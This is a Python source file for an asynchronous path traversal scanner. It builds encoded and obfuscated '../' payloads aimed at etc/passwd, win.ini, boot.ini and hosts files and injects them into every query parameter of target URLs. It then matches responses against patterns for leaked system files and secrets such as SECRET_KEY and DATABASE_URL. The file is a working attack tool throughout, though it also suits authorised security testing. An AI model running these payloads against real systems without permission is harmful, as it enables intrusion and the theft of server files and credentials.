import asyncio
import logging
import re
import urllib.parse
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import httpx

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


def get_success_patterns() -> List[str]:
    """Returns regex patterns indicating successful path traversal."""
    return [
        r'root:.*?:0:0:',
        r'daemon:.*?bin',
        r'\[boot loader\]',
        r'127\.0\.0\.1\s+localhost',
        r'\[extensions\]',
        r'\[fonts\]',
        r'for 16-bit app support',
        r'multi\(0\)disk\(0\)',
        r'<\?xml version=',
        r'ServerRoot',
        r'DocumentRoot',
        r'APP_ENV=',
        r'DATABASE_URL=',
        r'SECRET_KEY=',
        r'proc/version',
        r'kernel version',
        r'GNU/Linux',
    ]


def generate_payloads() -> List[str]:
    """Generates a list of encoded and obfuscated path traversal payloads."""
    target_files = [
        'etc/passwd', 'etc/hosts', 'proc/version',
        'windows/win.ini', 'winnt/win.ini', 'boot.ini',
        'windows/system32/drivers/etc/hosts',
    ]
    depths = ['../' * i for i in range(1, 10)]
    raw_payloads = [f"{depth}{target}" for depth in depths for target in target_files]

    encoded_payloads = set()
    for payload in raw_payloads:
        encoded_payloads.update({
            payload,
            urllib.parse.quote(payload),
            urllib.parse.quote(urllib.parse.quote(payload)),
            payload.replace('/', '\\'),
            payload.replace('..', '%2e%2e').replace('/', '%2f'),
            f"{payload}%00"
        })

    return list(encoded_payloads)


def create_client(timeout: int = 10) -> httpx.AsyncClient:
    """Creates a configured asynchronous HTTP client."""
    headers = {
        'User-Agent': 'Mozilla/5.0 (Security-Scanner) PathTraversal-Tester/2.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
    }
    return httpx.AsyncClient(
        headers=headers,
        timeout=httpx.Timeout(timeout, connect=5.0),
        limits=httpx.Limits(max_keepalive_connections=20, max_connections=100),
        follow_redirects=True,
        verify=True
    )


def check_vulnerability(response: httpx.Response, patterns: List[str]) -> Optional[str]:
    if response.status_code != 200:
        return None
    content = response.text.lower()

    # Avoid marking 'Warning: fopen(...)' as vulnerable
    if 'failed to open stream' in content or 'no such file' in content:
        return None

    for pattern in patterns:
        if re.search(pattern, content, re.IGNORECASE):
            return pattern
    return None



async def test_payload(
    client: httpx.AsyncClient,
    url: str,
    payload: str,
    patterns: List[str],
    max_retries: int = 3
) -> Dict:
    for attempt in range(max_retries):
        try:
            response = await client.get(url)
            match = check_vulnerability(response, patterns)
            return {
                'url': url,
                'payload': payload,
                'vulnerable': bool(match),
                'pattern_matched': match or 'N/A',
                'status_code': response.status_code,
                'response_length': len(response.text),
                'content_type': response.headers.get('content-type', 'unknown')
            }
        except httpx.RequestError as e:
            if attempt == max_retries - 1:
                logger.error(f"Request failed for {url}: {e}")
                return {
                    'url': url,
                    'payload': payload,
                    'vulnerable': False,
                    'error': str(e)
                }
            await asyncio.sleep(0.5 * (attempt + 1))
        except Exception as e:
            logger.error(f"Unhandled error for {url}: {e}")
            return {
                'url': url,
                'payload': payload,
                'vulnerable': False,
                'error': str(e)
            }


def build_payload_urls(base_url: str) -> List[Tuple[str, str]]:
    """Builds URLs by injecting path traversal payloads into all query parameters."""
    parsed = urlparse(base_url)
    original_params = parse_qs(parsed.query, keep_blank_values=True)

    if not original_params:
        logger.warning(f"No parameters found in URL: {base_url}")
        return []

    base_path = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', '', ''))
    payloads = generate_payloads()

    payload_urls = []
    for param in original_params:
        for payload in payloads:
            modified_params = original_params.copy()
            modified_params[param] = [payload]
            full_url = f"{base_path}?{urlencode(modified_params, doseq=True)}"
            payload_urls.append((full_url, payload))

    return payload_urls


async def scan_urls(
    payload_urls: List[Tuple[str, str]],
    timeout: int = 10,
    delay: float = 0.1,
    max_concurrent: int = 10
) -> Dict:
    patterns = get_success_patterns()
    findings = []
    semaphore = asyncio.Semaphore(max_concurrent)

    async def worker(url_payload: Tuple[str, str]) -> Optional[Dict]:
    
        url, payload = url_payload
        async with semaphore:
            async with create_client(timeout) as client:
                result = await test_payload(client, url, payload, patterns)
                if delay:
                    await asyncio.sleep(delay)
                return result

    results = await asyncio.gather(*[worker(item) for item in payload_urls])

    for res in results:
        if res and res.get('vulnerable'):
            logger.warning(f"Vulnerability confirmed: {res['url']} using payload {res['payload']}")
            findings.append(res)

    return {
        'findings': findings,
        'total_tested': len(payload_urls),
        'vulnerabilities_found': len(findings)
    }


async def run_path_traversal_scan(
    target_urls: List[str],
    timeout: int = 10,
    delay: float = 0.1,
    max_concurrent: int = 10
) -> Dict:
    all_payloads = []
    for url in target_urls:
        all_payloads.extend(build_payload_urls(url))

    return await scan_urls(
        payload_urls=all_payloads,
        timeout=timeout,
        delay=delay,
        max_concurrent=max_concurrent
    )
